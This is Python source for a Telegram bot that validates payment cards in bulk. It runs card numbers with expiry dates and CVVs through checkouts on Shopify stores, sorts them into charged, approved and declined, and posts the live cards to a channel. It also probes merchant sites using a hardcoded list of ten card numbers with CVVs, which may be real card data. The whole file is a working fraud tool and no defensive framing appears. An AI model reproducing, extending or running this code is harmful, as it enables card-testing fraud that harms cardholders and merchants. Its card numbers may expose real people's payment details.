import os
import asyncio
import logging
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)
from api import process_card, parse_cc_string, extract_clean_response, fetch_products

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ["BOT_TOKEN"]
CHANNEL_ID = int(os.environ["CHANNEL_ID"])
ADMIN_ID = int(os.environ.get("ADMIN_ID", "5451167865"))

# Conversation states
WAIT_CHK_INPUT, WAIT_MASS_SITE, WAIT_MASS_CARDS, WAIT_SITE_INPUT, WAIT_BIN_INPUT = range(5)

TEST_CARDS = [
    "5275150060415544|05|27|803",
    "5275150094498722|06|28|271",
    "5597580170432727|02|29|669",
    "4890222002785710|08|29|313",
    "4147342094178599|10|27|885",
    "5275150165633736|11|29|675",
    "5143773871130026|05|26|705",
    "5275150182030312|08|29|950",
    "4031633018355571|06|28|951",
    "4064980980901258|12|30|252",
]

DEAD_KEYWORDS = [
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'handle error', 'http 404',
    'url rejected', 'malformed input', 'amount_too_small',
    'site dead', 'captcha_required', 'captcha required', 'site errors',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'generic_error', 'generic error', 'site not supported',
]

WORKING_KEYWORDS = [
    'card_declined', 'fraud', 'incorrect_zip', 'invalid_cvc', 'invalid_cvv',
    'insufficient_funds', 'otp_required', 'order_placed', 'declined',
    'do_not_honor', 'incorrect_number', 'card_incorrect', 'expired_card',
    'pickup_card', 'restricted_card', 'stolen_card', 'lost_card',
    'card_velocity_exceeded', 'transaction_not_allowed', 'invalid_expiry',
    'processing_error', 'call_issuer', 'try_again_later', 'fraudulent',
    'security_violation', 'blocked', 'bad_cvv', 'cvv_fail',
    'authentication_required', 'mismatched_bill', 'charged', 'approved',
    'wrong_number', 'incorrect number', 'card incorrect',
]


# ─── Helpers ────────────────────────────────────────────────


def is_admin(update: Update) -> bool:
    return update.effective_user.id == ADMIN_ID


async def deny(update: Update):
    target = update.message or (update.callback_query and update.callback_query.message)
    if target:
        await target.reply_text("⛔ Access denied. Admin only.")


def classify_result(success, message):
    msg = message.lower()
    if 'order_placed' in msg:
        return 'charged'
    if 'otp_required' in msg:
        return 'tds'
    if any(k in msg for k in ['approved', 'insufficient', 'cvv', 'cvc', 'zip',
                               'incorrect_zip', 'invalid_cvv', 'invalid_cvc',
                               'insufficient_funds']):
        return 'approved'
    if success:
        return 'declined'
    for kw in WORKING_KEYWORDS:
        if kw in msg:
            return 'declined'
    if any(k in msg for k in DEAD_KEYWORDS):
        return 'error'
    return 'error'


def approved_message(message):
    msg = message.lower()
    if 'insufficient' in msg:
        return 'INSUFFICIENT_FUNDS'
    if 'invalid_cvv' in msg or ('cvv' in msg and 'invalid' in msg):
        return 'INVALID_CVV'
    if 'invalid_cvc' in msg or ('cvc' in msg and 'invalid' in msg):
        return 'INVALID_CVC'
    if 'incorrect_zip' in msg or 'zip' in msg:
        return 'INCORRECT_ZIP'
    if 'cvv' in msg:
        return 'INVALID_CVV'
    if 'cvc' in msg:
        return 'INVALID_CVC'
    clean = extract_clean_response(message)
    return clean.upper().replace(' ', '_')


async def get_bin_info(cc):
    try:
        bin6 = cc[:6]
        async with aiohttp.ClientSession() as session:
            async with session.get(
                f"https://bins.antipublic.cc/bins/{bin6}", timeout=aiohttp.ClientTimeout(total=5)
            ) as res:
                if res.status == 200:
                    data = await res.json()
                    return {
                        'brand': data.get('brand', 'UNKNOWN'),
                        'bank': data.get('bank', 'UNKNOWN'),
                        'country': data.get('country_name', 'UNKNOWN'),
                        'level': data.get('level', 'N/A'),
                        'type': data.get('type', 'N/A'),
                        'flag': data.get('country_flag', ''),
                    }
    except Exception:
        pass
    return {'brand': 'UNKNOWN', 'bank': 'UNKNOWN', 'country': 'UNKNOWN',
            'level': 'N/A', 'type': 'N/A', 'flag': ''}


def fmt_price(price, currency):
    try:
        if not price or price == '0':
            return "Free"
        return f"${float(price):.2f} {currency}"
    except Exception:
        return f"${price} {currency}"


def fmt_info(brand, type_cc, level):
    if level and level != 'N/A':
        return f"{brand} - {type_cc.upper()} - {level.upper()}"
    return f"{brand} - {type_cc.upper()}"


async def run_with_retry(parts, site, proxy_str=None, max_retries=3):
    last_success, last_msg, last_gate, last_price, last_cur = False, 'ERROR', '', '0', 'USD'
    for attempt in range(max_retries):
        try:
            success, message, gateway, price, currency = await process_card(
                parts['cc'], parts['mes'], parts['ano'], parts['cvv'], site, None, proxy_str
            )
            last_success, last_msg, last_gate, last_price, last_cur = (
                success, message, gateway, price, currency
            )
            category = classify_result(success, message)
            if category != 'error' or any(k in message.lower() for k in WORKING_KEYWORDS):
                return success, message, gateway, price, currency, category
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
        except Exception as e:
            last_msg = f"Error: {str(e)}"
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
    return last_success, last_msg, last_gate, last_price, last_cur, 'error'


def build_result_text(cc_string, category, clean, price_fmt, info_str, bank, country, flag):
    if category == 'charged':
        status = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
    elif category == 'approved':
        status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
    elif category == 'tds':
        status = "𝟑𝐃𝐒 ❎"
    elif category == 'declined':
        status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    else:
        status = "𝐄𝐫𝐫𝐨𝐫 ⚠️"

    return (
        f"ア 𝐂𝐚𝐫𝐝 ➜ <code>{cc_string}</code>\n"
        f"カ 𝙎𝙩𝙖𝙩𝙪𝙨 ➜ {status}\n"
        f"ツ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {clean}\n"
        f"キ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ 𝐀𝐮𝐭𝐨 𝐒𝐡𝐨𝐩𝐢𝐟𝐲\n"
        f"千 𝐏𝐫𝐢𝐜𝐞 ➜ {price_fmt}\n"
        f"━━━━━━━━━━━━━\n"
        f"零 𝙄𝙣𝙛𝙤 ➜ {info_str}\n"
        f"零 𝘽𝙖𝙣𝙠 ➜ {bank}\n"
        f"零 𝘾𝙤𝙪𝗻𝘁𝗿𝐲 ➜ {country} {flag}\n"
        f"━━━━━━━━━━━━━\n"
        f"力 𝐃𝐞𝐯 ➜ @Xoarch"
    )


def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔍 𝐒𝐢𝐧𝐠𝐥𝐞 𝐂𝐡𝐞𝐜𝐤", callback_data="btn_chk"),
         InlineKeyboardButton("📋 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤", callback_data="btn_mass")],
        [InlineKeyboardButton("🌐 𝐒𝐢𝐭𝐞 𝐂𝐡𝐞𝐜𝐤", callback_data="btn_site"),
         InlineKeyboardButton("📡 𝐌𝐚𝐬𝐬 𝐒𝐢𝐭𝐞", callback_data="btn_msite")],
        [InlineKeyboardButton("🏦 𝐁𝐈𝐍 𝐋𝐨𝐨𝐤𝐮𝐩", callback_data="btn_bin"),
         InlineKeyboardButton("❓ 𝐇𝐞𝐥𝐩", callback_data="btn_help")],
    ])


def back_button():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 𝐁𝐚𝐜𝐤 𝐭𝐨 𝐌𝐞𝐧𝐮", callback_data="btn_back")]
    ])


BANNER = (
    "███████╗██╗  ██╗ ██████╗ ██████╗ ██╗███████╗██╗   ██╗\n"
    "██╔════╝██║  ██║██╔═══██╗██╔══██╗██║██╔════╝╚██╗ ██╔╝\n"
    "███████╗███████║██║   ██║██████╔╝██║█████╗   ╚████╔╝ \n"
    "╚════██║██╔══██║██║   ██║██╔═══╝ ██║██╔══╝    ╚██╔╝  \n"
    "███████║██║  ██║╚██████╔╝██║     ██║██║        ██║   \n"
    "╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝        ╚═╝   \n"
)


# ─── /start and main menu ──────────────────────────────────


async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await deny(update)
        return
    await update.message.reply_text(
        f"{BANNER}\n𝐖𝐞𝐥𝐜𝐨𝐦𝐞! Select an option below 👇",
        reply_markup=main_menu_keyboard(),
    )


async def show_menu(query, context):
    await query.edit_message_text(
        f"{BANNER}\n𝐖𝐞𝐥𝐜𝐨𝐦𝐞! Select an option below 👇",
        reply_markup=main_menu_keyboard(),
    )


# ─── Button router ─────────────────────────────────────────


async def button_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if not is_admin(update):
        await deny(update)
        return

    data = query.data

    if data == "btn_back":
        await show_menu(query, context)
        return

    if data == "btn_chk":
        await query.edit_message_text(
            "🔍 <b>𝐒𝐢𝐧𝐠𝐥𝐞 𝐂𝐡𝐞𝐜𝐤</b>\n\n"
            "Send card and site in this format:\n"
            "<code>cc|mm|yy|cvv site_url</code>\n\n"
            "Example:\n<code>4242424242424242|12|28|123 https://example.com</code>",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        context.user_data['awaiting'] = 'chk'
        return

    if data == "btn_mass":
        await query.edit_message_text(
            "📋 <b>𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤</b>\n\n"
            "First, send the <b>site URL</b>:",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        context.user_data['awaiting'] = 'mass_site'
        return

    if data == "btn_site":
        await query.edit_message_text(
            "🌐 <b>𝐒𝐢𝐭𝐞 𝐂𝐡𝐞𝐜𝐤</b>\n\n"
            "Send the site URL to check:",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        context.user_data['awaiting'] = 'site'
        return

    if data == "btn_msite":
        await query.edit_message_text(
            "📡 <b>𝐌𝐚𝐬𝐬 𝐒𝐢𝐭𝐞 𝐂𝐡𝐞𝐜𝐤</b>\n\n"
            "Send a <b>.txt file</b> with sites (one per line)\n"
            "or send sites as text lines:",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        context.user_data['awaiting'] = 'msite'
        return

    if data == "btn_bin":
        await query.edit_message_text(
            "🏦 <b>𝐁𝐈𝐍 𝐋𝐨𝐨𝐤𝐮𝐩</b>\n\n"
            "Send the first 6 digits of a card:",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        context.user_data['awaiting'] = 'bin'
        return

    if data == "btn_help":
        await query.edit_message_text(
            "<b>𝐇𝐞𝐥𝐩 ❓</b>\n\n"
            "🔍 <b>Single Check</b> - Check one card against a site\n"
            "📋 <b>Mass Check</b> - Check many cards (send site, then .txt file)\n"
            "🌐 <b>Site Check</b> - Check if a Shopify site is alive\n"
            "📡 <b>Mass Site</b> - Check many sites at once\n"
            "🏦 <b>BIN Lookup</b> - Get card BIN information\n\n"
            "<b>𝐅𝐨𝐫𝐦𝐚𝐭𝐬:</b>\n"
            "Card: <code>cc_number|mm|yy|cvv</code>\n"
            "Site: <code>https://example.com</code>\n\n"
            "𝐃𝐞𝐯 ➜ @Xoarch",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        return


# ─── Text message handler (routes based on awaiting state) ─


async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await deny(update)
        return

    awaiting = context.user_data.get('awaiting')
    text = update.message.text.strip()

    if awaiting == 'chk':
        context.user_data['awaiting'] = None
        await handle_single_check(update, context, text)

    elif awaiting == 'mass_site':
        site = text if text.startswith('http') else f'https://{text}'
        context.user_data['mass_site'] = site
        context.user_data['awaiting'] = 'mass_cards'
        await update.message.reply_text(
            f"Site set: <code>{site}</code>\n\n"
            "Now send a <b>.txt file</b> with cards (one per line)\n"
            "or paste cards as text lines:",
            parse_mode="HTML",
            reply_markup=back_button(),
        )

    elif awaiting == 'mass_cards':
        context.user_data['awaiting'] = None
        cards = [l.strip() for l in text.splitlines() if '|' in l.strip()]
        if not cards:
            await update.message.reply_text(
                "No valid cards found. Each line should be: <code>cc|mm|yy|cvv</code>",
                parse_mode="HTML", reply_markup=main_menu_keyboard(),
            )
            return
        site = context.user_data.get('mass_site', '')
        await handle_mass_check(update, context, cards, site)

    elif awaiting == 'site':
        context.user_data['awaiting'] = None
        await handle_site_check(update, context, text)

    elif awaiting == 'msite':
        context.user_data['awaiting'] = None
        sites = [l.strip() for l in text.splitlines() if l.strip()]
        if not sites:
            await update.message.reply_text(
                "No sites found.", reply_markup=main_menu_keyboard(),
            )
            return
        await handle_mass_site(update, context, sites)

    elif awaiting == 'bin':
        context.user_data['awaiting'] = None
        await handle_bin_lookup(update, context, text)

    else:
        await update.message.reply_text(
            "Use the menu buttons 👇", reply_markup=main_menu_keyboard(),
        )


# ─── File handler ──────────────────────────────────────────


async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await deny(update)
        return

    doc = update.message.document
    if not doc:
        return

    file = await doc.get_file()
    data = await file.download_as_bytearray()
    lines = [l.strip() for l in data.decode('utf-8', errors='ignore').splitlines() if l.strip()]

    if not lines:
        await update.message.reply_text("File is empty.", reply_markup=main_menu_keyboard())
        return

    awaiting = context.user_data.get('awaiting')

    if awaiting == 'mass_cards':
        context.user_data['awaiting'] = None
        cards = [l for l in lines if '|' in l]
        if not cards:
            await update.message.reply_text("No valid cards in file.", reply_markup=main_menu_keyboard())
            return
        site = context.user_data.get('mass_site', '')
        await handle_mass_check(update, context, cards, site)

    elif awaiting == 'msite':
        context.user_data['awaiting'] = None
        await handle_mass_site(update, context, lines)

    elif '|' in lines[0]:
        await update.message.reply_text(
            f"Detected {len(lines)} cards.\n"
            "Press 📋 <b>Mass Check</b> to use them.",
            parse_mode="HTML", reply_markup=main_menu_keyboard(),
        )
    else:
        await update.message.reply_text(
            f"Detected {len(lines)} sites.\n"
            "Press 📡 <b>Mass Site</b> to use them.",
            parse_mode="HTML", reply_markup=main_menu_keyboard(),
        )


# ─── Feature handlers ──────────────────────────────────────


async def handle_single_check(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    parts_raw = text.split()
    if len(parts_raw) < 2:
        await update.message.reply_text(
            "Send: <code>cc|mm|yy|cvv site_url</code>",
            parse_mode="HTML", reply_markup=main_menu_keyboard(),
        )
        return

    cc_string = parts_raw[0]
    site = parts_raw[1]
    if not site.startswith('http'):
        site = 'https://' + site

    msg = await update.message.reply_text("𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠... ⏳")

    try:
        parts = parse_cc_string(cc_string)
    except ValueError as e:
        await msg.edit_text(f"Invalid format: {e}", reply_markup=main_menu_keyboard())
        return

    success, message, gateway, price, currency, category = await run_with_retry(parts, site)
    appr_clean = approved_message(message) if category == 'approved' else None
    clean = appr_clean if appr_clean else extract_clean_response(message)
    if category == 'charged':
        clean = 'ORDER_PLACED'
    elif category == 'tds':
        clean = 'OTP_REQUIRED'

    bin_info = await get_bin_info(parts['cc'])
    price_fmt = fmt_price(price, currency)
    info_str = fmt_info(bin_info['brand'], bin_info['type'], bin_info['level'])

    result_text = build_result_text(
        cc_string, category, clean, price_fmt, info_str,
        bin_info['bank'], bin_info['country'], bin_info['flag']
    )
    await msg.edit_text(result_text, parse_mode="HTML", reply_markup=main_menu_keyboard())

    if category in ('charged', 'approved', 'tds'):
        try:
            await context.bot.send_message(chat_id=CHANNEL_ID, text=result_text, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Channel post error: {e}")


async def handle_mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, site: str):
    msg = await update.message.reply_text(f"𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 {len(cards)} cards... ⏳")

    stats = {'charged': 0, 'approved': 0, 'tds': 0, 'declined': 0, 'error': 0}

    for i, cc_string in enumerate(cards):
        try:
            parts = parse_cc_string(cc_string)
        except Exception:
            stats['error'] += 1
            continue

        success, message, gateway, price, currency, category = await run_with_retry(parts, site)
        stats[category] += 1

        if category in ('charged', 'approved', 'tds'):
            appr_clean = approved_message(message) if category == 'approved' else None
            clean = appr_clean if appr_clean else extract_clean_response(message)
            if category == 'charged':
                clean = 'ORDER_PLACED'
            elif category == 'tds':
                clean = 'OTP_REQUIRED'

            bin_info = await get_bin_info(parts['cc'])
            price_fmt = fmt_price(price, currency)
            info_str = fmt_info(bin_info['brand'], bin_info['type'], bin_info['level'])
            result_text = build_result_text(
                cc_string, category, clean, price_fmt, info_str,
                bin_info['bank'], bin_info['country'], bin_info['flag']
            )
            try:
                await context.bot.send_message(chat_id=CHANNEL_ID, text=result_text, parse_mode="HTML")
            except Exception as e:
                logger.error(f"Channel post error: {e}")

        if (i + 1) % 10 == 0:
            try:
                await msg.edit_text(f"𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬: {i + 1}/{len(cards)} checked ⏳")
            except Exception:
                pass

    summary = (
        f"<b>𝐂𝐀𝐑𝐃 𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐑𝐄𝐒𝐔𝐋𝐓𝐒</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬: {len(cards)}\n\n"
        f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {stats['charged']} 🔥\n"
        f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {stats['approved']} ✅\n"
        f"𝟑𝐃𝐒: {stats['tds']} ❎\n"
        f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']} ❌\n"
        f"𝐄𝐫𝐫𝐨𝐫𝐬: {stats['error']} ⚠️\n"
        f"━━━━━━━━━━━━━━\n"
        f"𝐃𝐞𝐯 ➜ @Xoarch"
    )
    await msg.edit_text(summary, parse_mode="HTML", reply_markup=main_menu_keyboard())

    try:
        await context.bot.send_message(chat_id=CHANNEL_ID, text=summary, parse_mode="HTML")
    except Exception as e:
        logger.error(f"Channel summary error: {e}")


async def handle_site_check(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    site = text if text.startswith('http') else f'https://{text}'
    msg = await update.message.reply_text("𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐬𝐢𝐭𝐞... ⏳")

    test_cc = TEST_CARDS[0]
    parts = parse_cc_string(test_cc)

    try:
        success, message, gateway, price, currency, category = await run_with_retry(parts, site)
        msg_lower = message.lower()
        if any(kw in msg_lower for kw in WORKING_KEYWORDS) or category != 'error':
            await msg.edit_text(
                f"✅ <b>WORKING</b> ➜ <code>{site}</code>",
                parse_mode="HTML", reply_markup=main_menu_keyboard(),
            )
        else:
            await msg.edit_text(
                f"❌ <b>DEAD</b> ➜ <code>{site}</code>",
                parse_mode="HTML", reply_markup=main_menu_keyboard(),
            )
    except Exception:
        await msg.edit_text(
            f"❌ <b>DEAD</b> ➜ <code>{site}</code>",
            parse_mode="HTML", reply_markup=main_menu_keyboard(),
        )


async def handle_mass_site(update: Update, context: ContextTypes.DEFAULT_TYPE, sites: list):
    msg = await update.message.reply_text(f"𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 {len(sites)} sites... ⏳")

    working, dead = [], []
    for i, site in enumerate(sites):
        if not site.startswith('http'):
            site = 'https://' + site
        test_cc = TEST_CARDS[i % len(TEST_CARDS)]
        parts = parse_cc_string(test_cc)
        try:
            success, message, gateway, price, currency, category = await run_with_retry(parts, site)
            msg_lower = message.lower()
            if any(kw in msg_lower for kw in WORKING_KEYWORDS) or category != 'error':
                working.append(site)
            else:
                dead.append(site)
        except Exception:
            dead.append(site)

        if (i + 1) % 5 == 0:
            try:
                await msg.edit_text(f"𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬: {i + 1}/{len(sites)} ⏳")
            except Exception:
                pass

    summary = (
        f"<b>𝐒𝐈𝐓𝐄 𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐑𝐄𝐒𝐔𝐋𝐓𝐒</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"𝐓𝐨𝐭𝐚𝐥: {len(sites)}\n\n"
        f"𝐖𝐨𝐫𝐤𝐢𝐧𝐠: {len(working)} ✅\n"
        f"𝐃𝐞𝐚𝐝: {len(dead)} ❌\n"
        f"━━━━━━━━━━━━━━\n"
        f"𝐃𝐞𝐯 ➜ @Xoarch"
    )
    await msg.edit_text(summary, parse_mode="HTML", reply_markup=main_menu_keyboard())

    if working:
        working_text = "\n".join([f"✅ {s}" for s in working])
        await update.message.reply_text(
            f"<b>𝐖𝐨𝐫𝐤𝐢𝐧𝐠 𝐒𝐢𝐭𝐞𝐬:</b>\n{working_text}",
            parse_mode="HTML",
        )


async def handle_bin_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    bin6 = text.strip()[:6]
    if not bin6.isdigit() or len(bin6) < 6:
        await update.message.reply_text(
            "Send a valid 6-digit BIN number.",
            reply_markup=main_menu_keyboard(),
        )
        return

    info = await get_bin_info(bin6)
    result = (
        f"<b>🏦 𝐁𝐈𝐍 𝐋𝐨𝐨𝐤𝐮𝐩 ➜ {bin6}</b>\n"
        f"━━━━━━━━━━━━━\n"
        f"𝐁𝐫𝐚𝐧𝐝: {info['brand']}\n"
        f"𝐓𝐲𝐩𝐞: {info['type']}\n"
        f"𝐋𝐞𝐯𝐞𝐥: {info['level']}\n"
        f"𝐁𝐚𝐧𝐤: {info['bank']}\n"
        f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {info['country']} {info['flag']}\n"
        f"━━━━━━━━━━━━━\n"
        f"𝐃𝐞𝐯 ➜ @Xoarch"
    )
    await update.message.reply_text(result, parse_mode="HTML", reply_markup=main_menu_keyboard())


# ─── Main ──────────────────────────────────────────────────


def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CallbackQueryHandler(button_router))
    app.add_handler(MessageHandler(filters.Document.ALL, file_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    logger.info("Bot started polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
